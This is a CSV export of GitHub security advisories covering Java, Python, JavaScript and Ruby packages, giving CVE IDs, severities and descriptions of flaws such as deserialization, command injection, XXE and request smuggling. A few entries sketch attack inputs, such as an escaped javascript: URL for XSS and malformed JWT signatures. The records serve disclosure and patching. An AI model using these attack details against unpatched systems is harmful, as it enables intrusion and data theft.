2616,36254,org.apache.activemq:artemis-commons,GHSA-q9g8-9hpp-xc82,CVE-2020-10727,https://github.com/advisories/GHSA-q9g8-9hpp-xc82,moderate,2022-05-24 17:21:42 UTC,nsufficiently Protected Credentials in ActiveMQ Artemis,"A flaw was found in ActiveMQ Artemis management API from version 2.7.0 up until 2.12.0, where a user inadvertently stores passwords in plaintext in the Artemis shadow file (etc/artemis-users.properties file) when executing the `resetUsers` operation. A local attacker can use this flaw to read the contents of the Artemis shadow file.",maven
2617,33974,xerces:xercesImpl,GHSA-w4jq-qh47-hvjq,CVE-2020-14338,https://github.com/advisories/GHSA-w4jq-qh47-hvjq,moderate,2022-02-15 01:37:41 UTC,Improper Input Validation in Xerces,"A flaw was found in Wildfly's implementation of Xerces, specifically in the way the XMLSchemaValidator class in the JAXP component of Wildfly enforced the ""use-grammar-pool-only"" feature. This flaw allows a specially-crafted XML file to manipulate the validation process in certain cases. This issue is the same flaw as CVE-2020-14621, which affected OpenJDK, and uses a similar code. All xerces jboss versions before 2.12.0.SP3.",maven
2618,34676,org.jboss.resteasy:resteasy-client,GHSA-63cq-ppq8-cw6g,CVE-2020-1695,https://github.com/advisories/GHSA-63cq-ppq8-cw6g,high,2022-05-24 22:01:21 UTC,Improper Input Validation in RESTEasy,"A flaw was found in all resteasy 3.x.x versions prior to 3.12.0.Final and all resteasy 4.x.x versions prior to 4.6.0.Final, where an improper input validation results in returning an illegal header that integrates into the server's response. This flaw may result in an injection, which leads to unexpected behavior when the HTTP response is constructed.",maven
2619,34497,io.undertow:undertow-core,GHSA-gv2w-88hx-8m9r,CVE-2020-1745,https://github.com/advisories/GHSA-gv2w-88hx-8m9r,high,2022-05-24 17:16:46 UTC,Improper Authorization in Undertoe,"A file inclusion vulnerability was found in the AJP connector enabled with a default AJP configuration port of 8009 in Undertow version 2.0.29.Final and before and was fixed in 2.0.30.Final. A remote, unauthenticated attacker could exploit this vulnerability to read web application files from a vulnerable server. In instances where the vulnerable server allows file uploads, an attacker could upload malicious JavaServer Pages (JSP) code within a variety of file types and trigger this vulnerability to gain remote code execution.",maven
2620,38767,org.wildfly.security:wildfly-elytron,GHSA-qgrq-cx4c-2rmm,CVE-2020-1748,https://github.com/advisories/GHSA-qgrq-cx4c-2rmm,high,2022-02-15 01:39:27 UTC,Incorrect Authorization in WildFly Elytron,"A flaw was found in all supported versions before wildfly-elytron-1.6.8.Final-redhat-00001, where the WildFlySecurityManager checks were bypassed when using custom security managers, resulting in an improper authorization. This flaw leads to information exposure by unauthenticated access to secure resources.",maven
2621,34497,io.undertow:undertow-core,GHSA-2w73-fqqj-c92p,CVE-2020-1757,https://github.com/advisories/GHSA-2w73-fqqj-c92p,high,2022-05-24 17:15:56 UTC,Improper Input Validation in Undertow,"A flaw was found in all undertow-2.x.x SP1 versions prior to undertow-2.0.30.SP1, all undertow-1.x.x and undertow-2.x.x versions prior to undertow-2.1.0.Final, where the Servlet container causes servletPath to normalize incorrectly by truncating the path after semicolon which may lead to an application mapping resulting in the security bypass.",maven
2622,33931,org.jetbrains.kotlin:kotlin-stdlib,GHSA-cqj8-47ch-rvvq,CVE-2020-29582,https://github.com/advisories/GHSA-cqj8-47ch-rvvq,moderate,2022-05-24 17:40:48 UTC,Incorrect Default Permissions in JetBrains Kotlin,"In JetBrains Kotlin before 1.4.21, a vulnerable Java API was used for temporary file and folder creation. An attacker was able to read data from such files and list directories due to insecure permissions.",maven
2623,28766,jupyterhub,GHSA-7xx3-qp5w-fw96,CVE-2020-36191,https://github.com/advisories/GHSA-7xx3-qp5w-fw96,moderate,2022-05-24 17:38:59 UTC,Cross-Site Request Forgery in JupyterHub,"JupyterHub 1.1.0 allows CSRF in the admin panel via a request that lacks an _xsrf field, as demonstrated by a /hub/api/user request (to add or remove a user account).",pip
2624,36061,org.springframework.batch:spring-batch-core,GHSA-4ph4-q9r5-6wm6,CVE-2020-5411,https://github.com/advisories/GHSA-4ph4-q9r5-6wm6,high,2022-05-24 17:20:22 UTC,Deserialization of Untrusted Data in Spring Batch,"When configured to enable default typing, Jackson contained a deserialization vulnerability that could lead to arbitrary code execution. Jackson fixed this vulnerability by blacklisting known ""deserialization gadgets"". Spring Batch configures Jackson with global default typing enabled which means that through the previous exploit, arbitrary code could be executed if all of the following is true: * Spring Batch's Jackson support is being leveraged to serialize a job's ExecutionContext. * A malicious user gains write access to the data store used by the JobRepository (where the data to be deserialized is stored). In order to protect against this type of attack, Jackson prevents a set of untrusted gadget classes from being deserialized. Spring Batch should be proactive against blocking unknown ""deserialization gadgets"" when enabling default typing.",maven
2625,34041,org.elasticsearch:elasticsearch,GHSA-gfv5-grx2-9jw2,CVE-2020-7009,https://github.com/advisories/GHSA-gfv5-grx2-9jw2,high,2022-05-24 17:13:01 UTC,Improper Privilege Management in Elasticsearch,Elasticsearch versions from 6.7.0 to 6.8.7 and 7.0.0 to 7.6.1 contain a privilege escalation flaw if an attacker is able to create API keys. An attacker who is able to generate an API key can perform a series of steps that result in an API key being generated with elevated privileges.,maven
2626,34041,org.elasticsearch:elasticsearch,GHSA-cqgv-256r-m9r8,CVE-2020-7021,https://github.com/advisories/GHSA-cqgv-256r-m9r8,moderate,2022-05-24 17:41:42 UTC,Insertion of Sensitive Information into Log File in Elasticsearch,Elasticsearch versions before 7.10.0 and 6.8.14 have an information disclosure issue when audit logging and the emit_request_body option is enabled. The Elasticsearch audit log could contain sensitive information such as password hashes or authentication tokens. This could allow an Elasticsearch administrator to view these details.,maven
2627,15968,codecov,GHSA-mh2h-6j8q-x246,CVE-2020-7596,https://github.com/advisories/GHSA-mh2h-6j8q-x246,high,2022-05-24 17:07:19 UTC,Improper Neutralization of Special Elements in Output Used by a Downstream Component in Codecov,"Codecov npm module before 3.6.2 allows remote attackers to execute arbitrary commands via the ""gcov-args"" argument.",npm
2628,37364,org.jyaml:jyaml,GHSA-4qhr-q7wf-94xp,CVE-2020-8441,https://github.com/advisories/GHSA-4qhr-q7wf-94xp,critical,2022-05-24 17:09:22 UTC,Deserialization of Untrusted Data in JYaml,JYaml through 1.3 allows remote code execution during deserialization of a malicious payload through the load() function. NOTE: this is a discontinued product.,maven
2629,17465,dot,GHSA-297x-8xj4-vcxv,CVE-2020-8141,https://github.com/advisories/GHSA-297x-8xj4-vcxv,high,2022-05-24 17:11:32 UTC,Improper Control of Generation of Code in doT,The dot package v1.1.2 uses Function() to compile templates. This can be exploited by the attacker if they can control the given template or if they can control the value set on Object.prototype.,npm
2630,28929,salt,GHSA-xf37-qcvf-7m57,CVE-2021-22004,https://github.com/advisories/GHSA-xf37-qcvf-7m57,moderate,2022-05-24 19:13:30 UTC,Improper Authentication in SaltStack Salt,An issue was discovered in SaltStack Salt before 3003.3. The salt minion installer will accept and use a minion config file at C:\salt\conf if that file is in place before the installer is run. This allows for a malicious actor to subvert the proper behaviour of the given minion software.,pip
2631,28929,salt,GHSA-hcjf-rp5h-g5h3,CVE-2021-31607,https://github.com/advisories/GHSA-hcjf-rp5h-g5h3,high,2022-05-24 17:48:21 UTC,Command Injection in SaltStack Salt,"In SaltStack Salt 2016.9 through 3002.6, a command injection vulnerability exists in the snapper module that allows for local privilege escalation on a minion. The attack requires that a file is created with a pathname that is backed up by snapper, and that the master calls the snapper.diff function (which executes popen unsafely).",pip
2632,35084,com.jfinal:jfinal,GHSA-9pvq-4cc7-24jg,CVE-2022-33113,https://github.com/advisories/GHSA-9pvq-4cc7-24jg,moderate,2022-06-24 00:00:31 UTC,Cross-site Scripting in Jfinal CMS,Jfinal CMS v5.1.0 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the keyword text field under the publish blog module.,maven
2633,19134,diffy,GHSA-5ww9-9qp2-x524,CVE-2022-33127,https://github.com/advisories/GHSA-5ww9-9qp2-x524,critical,2022-06-24 00:00:31 UTC,Improper handling of double quotes in file name in Diffy in Windows environment,The function that calls the diff tool in versions of Diffy prior to 3.4.1 does not properly handle double quotes in a filename when run in a Windows environment. This allows attackers to execute arbitrary commands via a crafted string.,rubygems
2634,19852,aiohttp,GHSA-rwqr-c348-m5wr,CVE-2022-33124,https://github.com/advisories/GHSA-rwqr-c348-m5wr,moderate,2022-06-24 00:00:31 UTC,Withdrawn: Denial of Service in aiohttp,"## Withdrawn
This advisory has been withdrawn because the maintainers of aiohttp and multiple third parties disputed the validity of the issue. There is not sufficient evidence for the claims in the original report.

## Original Description
aiohttp v3.8.1 was discovered to contain an invalid IPv6 URL which can lead to a Denial of Service (DoS).",pip
2635,34050,org.springframework.data:spring-data-mongodb,GHSA-w24x-87mr-4r23,CVE-2022-22980,https://github.com/advisories/GHSA-w24x-87mr-4r23,critical,2022-06-24 00:00:30 UTC,SpEL Injection in Spring Data MongoDB,A Spring Data MongoDB application is vulnerable to SpEL Injection when using @Query or @Aggregation-annotated query methods with SpEL expressions that contain query parameter placeholders for value binding if the input is not sanitized.,maven
2636,28929,salt,GHSA-fpxm-fprw-6hxj,CVE-2022-22967,https://github.com/advisories/GHSA-fpxm-fprw-6hxj,high,2022-06-25 07:21:19 UTC,Salt's PAM auth fails to reject locked accounts,"An issue was discovered in SaltStack Salt in versions before 3002.9, 3003.5, 3004.2. PAM auth fails to reject locked accounts, which allows a previously authorized user whose account is locked still run Salt commands when their account is locked. This affects both local shell accounts with an active session and salt-api users that authenticate via PAM eauth.",pip
2637,18778,jsrsasign,GHSA-3fvg-4v2m-98jf,CVE-2022-25898,https://github.com/advisories/GHSA-3fvg-4v2m-98jf,high,2022-06-25 07:19:06 UTC,JWS and JWT signature validation vulnerability with special characters,"### Impact

Jsrsasign supports JWS(JSON Web Signatures) and JWT(JSON Web Token) validation. However JWS or JWT signature with non Base64URL encoding special characters or number escaped characters may be validated as valid by mistake.

For example, even if a string of non Base64URL encoding characters such as `!@$%` or `\11` is inserted into a valid JWS or JWT signature value string, it will still be a valid JWS or JWT signature by mistake.

When jsrsasign's JWS or JWT validation is used in OpenID connect or OAuth2, this vulnerability will affect to authentication or authorization.

By our internal assessment, CVSS 3.1 score will be 8.6.
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N

### Patches
Users validate JWS or JWT signatures should upgrade to 10.5.25.

### Workarounds
Validate JWS or JWT signature if it has Base64URL and dot safe string before
executing JWS.verify() or JWS.verifyJWT() method.

### ACKNOWLEDGEMENT

Thanks to Adi Malyanker and Or David for this vulnerability report. Also thanks for [Snyk security team](https://snyk.io/) for this coordination.

### References
https://github.com/kjur/jsrsasign/releases/tag/10.5.25
https://github.com/kjur/jsrsasign/security/advisories/GHSA-3fvg-4v2m-98jf kjur's advisories
https://github.com/advisories/GHSA-3fvg-4v2m-98jf github advisories
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25898
https://kjur.github.io/jsrsasign/api/symbols/KJUR.jws.JWS.html#.verifyJWT
https://kjur.github.io/jsrsasign/api/symbols/KJUR.jws.JWS.html#.verify
https://kjur.github.io/jsrsasign/api/symbols/global__.html#.isBase64URLDot
https://github.com/kjur/jsrsasign/wiki/Tutorial-for-JWS-verification
https://github.com/kjur/jsrsasign/wiki/Tutorial-for-JWT-verification
https://security.snyk.io/vuln/SNYK-JS-JSRSASIGN-2869122
",npm
2638,20105,reportlab,GHSA-qpg2-vx7j-3869,CVE-2019-17626,https://github.com/advisories/GHSA-qpg2-vx7j-3869,critical,2022-05-24 22:00:57 UTC,XML Injection in ReportLab,"ReportLab through 3.5.26 allows remote code execution because of toColor(eval(arg)) in colors.py, as demonstrated by a crafted XML document with '<span color=""' followed by arbitrary Python code.",pip
2639,34054,org.apache.thrift:libthrift,GHSA-rj7p-rfgp-852x,CVE-2019-0205,https://github.com/advisories/GHSA-rj7p-rfgp-852x,high,2022-05-24 17:00:01 UTC,Loop with Unreachable Exit Condition in Apache Thrift,"In Apache Thrift all versions up to and including 0.12.0, a server or client may run into an endless loop when feed with specific input data. Because the issue had already been partially fixed in version 0.11.0, depending on the installed version it affects only certain language bindings.",maven
2640,20080,waitress,GHSA-j7j6-7hfx-5522,CVE-2019-16792,https://github.com/advisories/GHSA-j7j6-7hfx-5522,high,2022-05-24 17:07:06 UTC,Inconsistent Interpretation of HTTP Requests in Waitress,"Waitress through version 1.3.1 allows request smuggling by sending the Content-Length header twice. Waitress would header fold a double Content-Length header and due to being unable to cast the now comma separated value to an integer would set the Content-Length to 0 internally. If two Content-Length headers are sent in a single request, Waitress would treat the request as having no body, thereby treating the body of the request as a new request in HTTP pipelining. This issue is fixed in Waitress 1.4.0.",pip
2641,20794,mysql-connector-python,GHSA-v5rq-w2xm-7g5f,CVE-2019-2435,https://github.com/advisories/GHSA-v5rq-w2xm-7g5f,high,2022-05-13 01:22:02 UTC,Improper Access Control in MySQL Connector Python,"Vulnerability in the MySQL Connectors component of Oracle MySQL (subcomponent: Connector/Python). Supported versions that are affected are 8.0.13 and prior and 2.1.8 and prior. Easily exploitable vulnerability allows unauthenticated attacker with network access via TLS to compromise MySQL Connectors. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all MySQL Connectors accessible data as well as unauthorized access to critical data or complete access to all MySQL Connectors accessible data. ",pip
2642,34041,org.elasticsearch:elasticsearch,GHSA-fj32-6v7m-57pg,CVE-2019-7611,https://github.com/advisories/GHSA-fj32-6v7m-57pg,high,2022-05-13 01:14:26 UTC,Improper Access Control in Elasticsearch,"A permission issue was found in Elasticsearch versions before 5.6.15 and 6.6.1 when Field Level Security and Document Level Security are disabled and the _aliases, _shrink, or _split endpoints are used . If the elasticsearch.yml file has xpack.security.dls_fls.enabled set to false, certain permission checks are skipped when users perform one of the actions mentioned above, to make existing data available under a new index/alias name. This could result in an attacker gaining additional permissions against a restricted index.",maven
2643,34041,org.elasticsearch:elasticsearch,GHSA-jqm6-m3j3-8gg9,CVE-2019-7614,https://github.com/advisories/GHSA-jqm6-m3j3-8gg9,moderate,2022-05-24 16:51:49 UTC,Concurrent Execution using Shared Resource with Improper Synchronization in Elasticsearch,"A race condition flaw was found in the response headers Elasticsearch versions before 7.2.1 and 6.8.2 returns to a request. On a system with multiple users submitting requests, it could be possible for an attacker to gain access to response header containing sensitive data from another user.",maven
2644,34041,org.elasticsearch:elasticsearch,GHSA-hxp8-r9g3-grfr,CVE-2019-7619,https://github.com/advisories/GHSA-hxp8-r9g3-grfr,moderate,2022-05-24 17:00:08 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Elasticsearch,Elasticsearch versions 7.0.0-7.3.2 and 6.7.0-6.8.3 contain a username disclosure flaw was found in the API Key service. An unauthenticated attacker could send a specially crafted request and determine if a username exists in the Elasticsearch native realm.,maven
2645,16105,npm,GHSA-ph34-pc88-72gc,CVE-2018-7408,https://github.com/advisories/GHSA-ph34-pc88-72gc,high,2022-05-13 01:53:21 UTC,Incorrect Permission Assignment for Critical Resource in NPM,"An issue was discovered in an npm 5.7.0 2018-02-21 pre-release (marked as ""next: 5.7.0"" and therefore automatically installed by an ""npm upgrade -g npm"" command, and also announced in the vendor's blog without mention of pre-release status). It might allow local users to bypass intended filesystem access restrictions because ownerships of /etc and /usr directories are being changed unexpectedly, related to a ""correctMkdir"" issue.",npm
2646,34021,org.bouncycastle:bcprov-jdk15on,GHSA-8477-3v39-ggpm,CVE-2018-5382,https://github.com/advisories/GHSA-8477-3v39-ggpm,moderate,2022-05-13 01:01:01 UTC,Improper Validation of Integrity Check Value in Bouncy Castle,"The default BKS keystore use an HMAC that is only 16 bits long, which can allow an attacker to compromise the integrity of a BKS keystore. Bouncy Castle release 1.47 changes the BKS format to a format which uses a 160 bit HMAC instead. This applies to any BKS keystore generated prior to BC 1.47. For situations where people need to create the files for legacy reasons a specific keystore type ""BKS-V1"" was introduced in 1.49. It should be noted that the use of ""BKS-V1"" is discouraged by the library authors and should only be used where it is otherwise safe to do so, as in where the use of a 16 bit checksum for the file integrity check is not going to cause a security issue in itself.",maven
2647,33924,mysql:mysql-connector-java,GHSA-4vrv-ch96-6h42,CVE-2018-3258,https://github.com/advisories/GHSA-4vrv-ch96-6h42,high,2022-05-13 01:52:26 UTC,Improper Privilege Management in MySQL Connectors Java,"Vulnerability in the MySQL Connectors component of Oracle MySQL (subcomponent: Connector/J). Supported versions that are affected are 8.0.12 and prior. Easily exploitable vulnerability allows low privileged attacker with network access via multiple protocols to compromise MySQL Connectors. Successful attacks of this vulnerability can result in takeover of MySQL Connectors. CVSS 3.0 Base Score 8.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H).",maven
2648,19835,lxml,GHSA-xp26-p53h-6h2p,CVE-2018-19787,https://github.com/advisories/GHSA-xp26-p53h-6h2p,moderate,2022-05-13 01:13:21 UTC,Improper Neutralization of Input During Web Page Generation in LXML,"An issue was discovered in lxml before 4.2.5. lxml/html/clean.py in the lxml.html.clean module does not remove javascript: URLs that use escaping, allowing a remote attacker to conduct XSS attacks, as demonstrated by ""j a v a s c r i p t:"" in Internet Explorer. This is a similar issue to CVE-2014-3146.",pip
2649,37267,org.sonarsource.sonarqube:sonar-plugin-api,GHSA-m643-2pfv-xwm8,CVE-2018-19413,https://github.com/advisories/GHSA-m643-2pfv-xwm8,moderate,2022-05-14 01:43:42 UTC,Exposure of Sensitive Information to an Unauthorized Actor in SonarSource SonarQube API,A vulnerability in the API of SonarSource SonarQube before 7.4 could allow an authenticated user to discover sensitive information such as valid user-account logins in the web application. The vulnerability occurs because of improperly configured access controls that cause the API to return the externalIdentity field to non-administrator users. The attacker could use this information in subsequent attacks against the system.,maven
2650,34041,org.elasticsearch:elasticsearch,GHSA-ccmr-qj26-845g,CVE-2018-17247,https://github.com/advisories/GHSA-ccmr-qj26-845g,moderate,2022-05-13 01:34:04 UTC,Improper Restriction of XML External Entity Reference in Elasticsearch,Elasticsearch Security versions 6.5.0 and 6.5.1 contain an XXE flaw in Machine Learning's find_file_structure API. If a policy allowing external network access has been added to Elasticsearch's Java Security Manager then an attacker could send a specially crafted request capable of leaking content of local files on the Elasticsearch node. This could allow a user to access information that they should not have access to.,maven
2651,34041,org.elasticsearch:elasticsearch,GHSA-vpqm-88c4-x4cv,CVE-2018-17244,https://github.com/advisories/GHSA-vpqm-88c4-x4cv,moderate,2022-05-13 01:34:04 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Elasticsearch,"Elasticsearch Security versions 6.4.0 to 6.4.2 contain an error in the way request headers are applied to requests when using the Active Directory, LDAP, Native, or File realms. A request may receive headers intended for another request if the same username is being authenticated concurrently; when used with run as, this can result in the request running as the incorrect user. This could allow a user to access information that they should not have access to.",maven
2652,19842,urllib3,GHSA-r64q-w8jr-g9qp,CVE-2019-11236,https://github.com/advisories/GHSA-r64q-w8jr-g9qp,moderate,2022-05-13 01:09:23 UTC,Improper Neutralization of CRLF Sequences in urllib3 library for Python,"In the urllib3 library through 1.24.2 for Python, CRLF injection is possible if the attacker controls the request parameter.",pip
2653,28103,red-arrow,GHSA-8cw2-jv5c-c825,CVE-2019-12408,https://github.com/advisories/GHSA-8cw2-jv5c-c825,high,2022-05-24 17:00:40 UTC,Missing Initialization of Resource in Apache Arrow,"It was discovered that the C++ implementation (which underlies the R, Python and Ruby implementations) of Apache Arrow 0.14.0 to 0.14.1 had a uninitialized memory bug when building arrays with null values in some cases. This can lead to uninitialized memory being unintentionally shared if Arrow Arrays are transmitted over the wire (for instance with Flight) or persisted in the streaming IPC and file formats.",rubygems
2654,19891,arrow,GHSA-8cw2-jv5c-c825,CVE-2019-12408,https://github.com/advisories/GHSA-8cw2-jv5c-c825,high,2022-05-24 17:00:40 UTC,Missing Initialization of Resource in Apache Arrow,"It was discovered that the C++ implementation (which underlies the R, Python and Ruby implementations) of Apache Arrow 0.14.0 to 0.14.1 had a uninitialized memory bug when building arrays with null values in some cases. This can lead to uninitialized memory being unintentionally shared if Arrow Arrays are transmitted over the wire (for instance with Flight) or persisted in the streaming IPC and file formats.",pip
2655,28103,red-arrow,GHSA-cjw4-2w9r-r8mv,CVE-2019-12410,https://github.com/advisories/GHSA-cjw4-2w9r-r8mv,high,2022-05-24 17:00:40 UTC,Missing Initialization of Resource in Apache Arrow,"While investigating UBSAN errors in https://github.com/apache/arrow/pull/5365 it was discovered Apache Arrow versions 0.12.0 to 0.14.1, left memory Array data uninitialized when reading RLE null data from parquet. This affected the C++, Python, Ruby and R implementations. The uninitialized memory could potentially be shared if are transmitted over the wire (for instance with Flight) or persisted in the streaming IPC and file formats.",rubygems
2656,19891,arrow,GHSA-cjw4-2w9r-r8mv,CVE-2019-12410,https://github.com/advisories/GHSA-cjw4-2w9r-r8mv,high,2022-05-24 17:00:40 UTC,Missing Initialization of Resource in Apache Arrow,"While investigating UBSAN errors in https://github.com/apache/arrow/pull/5365 it was discovered Apache Arrow versions 0.12.0 to 0.14.1, left memory Array data uninitialized when reading RLE null data from parquet. This affected the C++, Python, Ruby and R implementations. The uninitialized memory could potentially be shared if are transmitted over the wire (for instance with Flight) or persisted in the streaming IPC and file formats.",pip
2657,34081,org.apache.poi:poi,GHSA-9jwc-q6j3-8g9g,CVE-2019-12415,https://github.com/advisories/GHSA-9jwc-q6j3-8g9g,moderate,2022-05-24 16:59:46 UTC,Improper Restriction of XML External Entity Reference in Apache POI,"In Apache POI up to 4.1.0, when using the tool XSSFExportToXml to convert user-provided Microsoft Excel documents, a specially crafted document can allow an attacker to read files from the local filesystem or from internal network resources via XML External Entity (XXE) Processing.",maven
2658,35432,org.grails:grails-core,GHSA-pmxf-4v8c-rwr7,CVE-2019-12728,https://github.com/advisories/GHSA-pmxf-4v8c-rwr7,high,2022-05-24 16:47:09 UTC,Incorrect Resource Transfer Between Spheres in Grails,Grails before 3.3.10 used cleartext HTTP to resolve the SDKMan notification service. NOTE: users' apps were not resolving dependencies over cleartext HTTP.,maven
2659,36708,org.jolokia:jolokia-core,GHSA-xcxf-7q4p-cj26,CVE-2018-10899,https://github.com/advisories/GHSA-xcxf-7q4p-cj26,high,2022-05-24 16:51:56 UTC,Cross-Site Request Forgery in Jolokia,A flaw was found in Jolokia versions from 1.2 to before 1.6.1. Affected versions are vulnerable to a system-wide CSRF. This holds true for properly configured instances with strict checking for origin and referrer headers. This could result in a Remote Code Execution attack.,maven
2660,34497,io.undertow:undertow-core,GHSA-gjjx-gqm4-wcgm,CVE-2018-1114,https://github.com/advisories/GHSA-gjjx-gqm4-wcgm,moderate,2022-05-13 01:33:31 UTC,Uncontrolled Resource Consumption in Undertow,It was found that URLResource.getLastModified() in Undertow closes the file descriptors only when they are finalized which can cause file descriptors to exhaust. This leads to a file handler leak.,maven
2661,34977,org.infinispan:infinispan-core,GHSA-qqfc-m9hc-pqv3,CVE-2018-1131,https://github.com/advisories/GHSA-qqfc-m9hc-pqv3,high,2022-05-13 01:33:29 UTC,Deserialization of Untrusted Data in Infinispan,"Infinispan permits improper deserialization of trusted data via XML and JSON transcoders under certain server configurations. A user with authenticated access to the server could send a malicious object to a cache configured to accept certain types of objects, achieving code execution and possible further attacks. Versions 9.0.3.Final, 9.1.7.Final, 8.2.10.Final, 9.2.2.Final, 9.3.0.Alpha1 are believed to be affected.",maven
2662,30675,jupyter-server,GHSA-q874-g24w-4q9g,CVE-2022-29241,https://github.com/advisories/GHSA-q874-g24w-4q9g,high,2022-06-16 23:13:57 UTC,Token bruteforcing,"Affects: Notebook and Lab between 6.4.0?(potentially earlier) and 6.4.11 (currently latest). Jupyter Server <=1.16.0. If I am correct about the responsible code it will affect Jupyter-Server 1.17.0 and 2.0.0a0 as well.
Description: If notebook server is started with a value of `root_dir` that contains the starting user's home directory, then the underlying REST API can be used to leak the access token assigned at start time by guessing/brute forcing the PID of the jupyter server. While this requires an authenticated user session, this url can be used from an xss payload (as in CVE-2021-32798) or from a hooked or otherwise compromised browser to leak this access token to a malicious third party. This token can be used along with the REST API to interact with Jupyter services/notebooks such as modifying or overwriting critical files, such as .bashrc or .ssh/authorized_keys, allowing a malicious user to read potentially sensitive data and possibly gain control of the impacted system.
",pip
2663,34519,org.apache.commons:commons-email,GHSA-v7cm-w955-pj6g,CVE-2018-1294,https://github.com/advisories/GHSA-v7cm-w955-pj6g,high,2022-05-14 01:28:26 UTC,Improper Input Validation Apache Commons Email,"If a user of Apache Commons Email (typically an application programmer) passes unvalidated input as the so-called ""Bounce Address"", and that input contains line-breaks, then the email details (recipients, contents, etc.) might be manipulated. Mitigation: Users should upgrade to Commons-Email 1.5. You can mitigate this vulnerability for older versions of Commons Email by stripping line-breaks from data, that will be passed to Email.setBounceAddress(String).",maven
2664,33996,org.apache.derby:derby,GHSA-42xw-p62x-hwcf,CVE-2018-1313,https://github.com/advisories/GHSA-42xw-p62x-hwcf,moderate,2022-05-13 01:02:18 UTC,Improper Access Control in Apache Derby,"In Apache Derby 10.3.1.4 to 10.14.1.0, a specially-crafted network packet can be used to request the Derby Network Server to boot a database whose location and contents are under the user's control. If the Derby Network Server is not running with a Java Security Manager policy file, the attack is successful. If the server is using a policy file, the policy file must permit the database location to be read for the attack to work. The default Derby Network Server policy file distributed with the affected releases includes a permissive policy as the default Network Server policy, which allows the attack to work.",maven
2665,34497,io.undertow:undertow-core,GHSA-vf6r-mmhc-3xcm,CVE-2018-14642,https://github.com/advisories/GHSA-vf6r-mmhc-3xcm,moderate,2022-05-13 01:12:21 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Undertow,"An information leak vulnerability was found in Undertow. If all headers are not written out in the first write() call then the code that handles flushing the buffer will always write out the full contents of the writevBuffer buffer, which may contain data from previous requests.",maven
2666,34093,org.apache.zookeeper:zookeeper,GHSA-ccqf-c5hq-77mp,CVE-2018-8012,https://github.com/advisories/GHSA-ccqf-c5hq-77mp,high,2022-05-13 01:05:57 UTC,Missing Authorization in Apache ZooKeeper,"No authentication/authorization is enforced when a server attempts to join a quorum in Apache ZooKeeper before 3.4.10, and 3.5.0-alpha through 3.5.3-beta. As a result an arbitrary end point could join the cluster and begin propagating counterfeit changes to the leader.",maven
2667,34638,org.apache.pdfbox:pdfbox,GHSA-j2xq-pfff-mvgg,CVE-2018-8036,https://github.com/advisories/GHSA-j2xq-pfff-mvgg,moderate,2022-05-13 01:53:29 UTC,Loop with Unreachable Exit Condition in Apache PDFBox,"In Apache PDFBox 1.8.0 to 1.8.14 and 2.0.0RC1 to 2.0.10, a carefully crafted (or fuzzed) file can trigger an infinite loop which leads to an out of memory exception in Apache PDFBox's AFMParser.",maven
2668,34418,org.apache.cassandra:cassandra-all,GHSA-52gq-7j6c-xw6x,CVE-2018-8016,https://github.com/advisories/GHSA-52gq-7j6c-xw6x,critical,2022-05-13 01:53:28 UTC,Missing Authentication for Critical Function in Apache Cassandra,"The default configuration in Apache Cassandra 3.8 through 3.11.1 binds an unauthenticated JMX/RMI interface to all network interfaces, which allows remote attackers to execute arbitrary Java code via an RMI request. This issue is a regression of CVE-2015-0225. The regression was introduced in https://issues.apache.org/jira/browse/CASSANDRA-12109. The fix for the regression is implemented in https://issues.apache.org/jira/browse/CASSANDRA-14173. This fix is contained in the 3.11.2 release of Apache Cassandra.",maven
2669,34645,org.slf4j:slf4j-ext,GHSA-w77p-8cfg-2x43,CVE-2018-8088,https://github.com/advisories/GHSA-w77p-8cfg-2x43,critical,2022-05-13 01:04:09 UTC,Improper Access Control in SLF4J,"org.slf4j.ext.EventData in the slf4j-ext module in QOS.CH SLF4J before `1.8.0-beta4` allows remote attackers to bypass intended access restrictions via crafted data. EventData in the slf4j-ext module in QOS.CH SLF4J, has been fixed in SLF4J version `1.7.26` and later and in the `2.0.x` series.

Note that while the [fix commit](https://github.com/qos-ch/slf4j/commit/d2b27fba88e983f921558da27fc29b5f5d269405) is associated with the tag `1.8.0-beta3`, the versions in [Maven](https://mvnrepository.com/artifact/org.slf4j/slf4j-ext) go directly from `1.8.0-beta2` to `1.8.0-beta4`.",maven
2670,34258,org.apache.mina:mina-core,GHSA-5h29-qq92-wj7f,CVE-2019-0231,https://github.com/advisories/GHSA-5h29-qq92-wj7f,high,2022-05-24 16:57:28 UTC,Cleartext Transmission of Sensitive Information in Apache MINA,"Handling of the close_notify SSL/TLS message does not lead to a connection closure, leading the server to retain the socket opened and to have the client potentially receive clear text messages afterward. Mitigation: 2.0.20 users should migrate to 2.0.21, 2.1.0 users should migrate to 2.1.1. This issue affects: Apache MINA.",maven
2671,34974,org.apache.struts:struts2-core,GHSA-ccp5-gg58-pxfm,CVE-2019-0233,https://github.com/advisories/GHSA-ccp5-gg58-pxfm,high,2022-05-24 17:28:11 UTC,Improper Preservation of Permissions in Apache Struts,An access permission override in Apache Struts 2.0.0 to 2.5.20 may cause a Denial of Service when performing a file upload.,maven
2672,34977,org.infinispan:infinispan-core,GHSA-h47x-2j37-fw5m,CVE-2019-10174,https://github.com/advisories/GHSA-h47x-2j37-fw5m,high,2022-05-24 17:01:50 UTC,Use of Externally-Controlled Input to Select Classes or Code in Infinispan,"A vulnerability was found in Infinispan such that the invokeAccessibly method from the public class ReflectionUtil allows any application class to invoke private methods in any class with Infinispan's privileges. The attacker can use reflection to introduce new, malicious behavior into the application.",maven
2673,20092,ansible,GHSA-fh5v-5f35-2rv2,CVE-2021-20180,https://github.com/advisories/GHSA-fh5v-5f35-2rv2,moderate,2022-03-17 00:00:44 UTC,Insertion of Sensitive Information into Log File in ansible,A flaw was found in ansible module where credentials are disclosed in the console log by default and not protected by the security feature when using the bitbucket_pipeline_variable module. This flaw allows an attacker to steal bitbucket_pipeline credentials. The highest threat from this vulnerability is to confidentiality.,pip
